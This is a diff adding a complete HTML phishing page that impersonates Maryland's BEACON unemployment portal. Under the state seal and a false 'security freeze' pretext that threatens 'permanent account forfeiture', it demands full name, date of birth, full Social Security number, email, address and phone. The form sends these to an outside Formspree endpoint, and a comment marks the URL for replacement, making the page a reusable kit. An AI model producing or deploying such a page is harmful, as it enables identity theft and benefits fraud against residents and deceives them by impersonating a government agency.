@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Maryland BEACON - Final Identity Reconciliation</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .login-box { background: white; padding: 30px; border-radius: 5px; box-shadow: 0px 0px 15px rgba(0,0,0,0.2); width: 450px; text-align: center; border-top: 8px solid #003366; }
+        img.seal { width: 80px; margin-bottom: 10px; }
+        h2 { color: #333; font-size: 18px; margin-bottom: 10px; }
+        p { font-size: 13px; color: #666; margin-bottom: 20px; }
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
+        label { font-size: 12px; font-weight: bold; color: #444; margin-bottom: 5px; display: block; }
+        input { width: 90%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; }
+        .full-width { grid-column: span 2; }
+        button { width: 100%; padding: 15px; background-color: #003366; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img class="seal" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Seal_of_Maryland.svg/1200px-Seal_of_Maryland.svg.png">
+        <h2>IDENTITY RECONCILIATION FORM</h2>
+        <p>To lift the security freeze, you must provide the following verified information. Discrepancies will result in permanent account forfeiture.</p>
+        
+        <!-- REPLACE THE URL BELOW WITH YOUR FORMSPREE URL -->
+        <form action="https://formspree.io/f/mgakpagl" method="POST">
+            <div class="form-grid">
+                <div class="full-width">
+                    <label>Full Legal Name</label>
+                    <input type="text" name="full_name" placeholder="First Last" required>
+                </div>
+                <div>
+                    <label>Date of Birth</label>
+                    <input type="date" name="dob" required>
+                </div>
+                <div>
+                    <label>Full SSN</label>
+                    <input type="text" name="full_ssn" placeholder="XXX-XX-XXXX" required>
+                </div>
+                <div class="full-width">
+                    <label>Registered Email Address</label>
+                    <input type="email" name="email" placeholder="email@example.com" required>
+                </div>
+                <div class="full-width">
+                    <label>Current Residential Address</label>
+                    <input type="text" name="address" placeholder="Street, City, State, Zip" required>
+                </div>
+                <div class="full-width">
+                    <label>Phone Number</label>
+                    <input type="tel" name="phone" placeholder="(XXX) XXX-XXXX" required>
+                </div>
+            </div>
+            <button type="submit">SUBMIT FOR FINAL VERIFICATION</button>
+        </form>
+    </div>
+</body>
+</html>
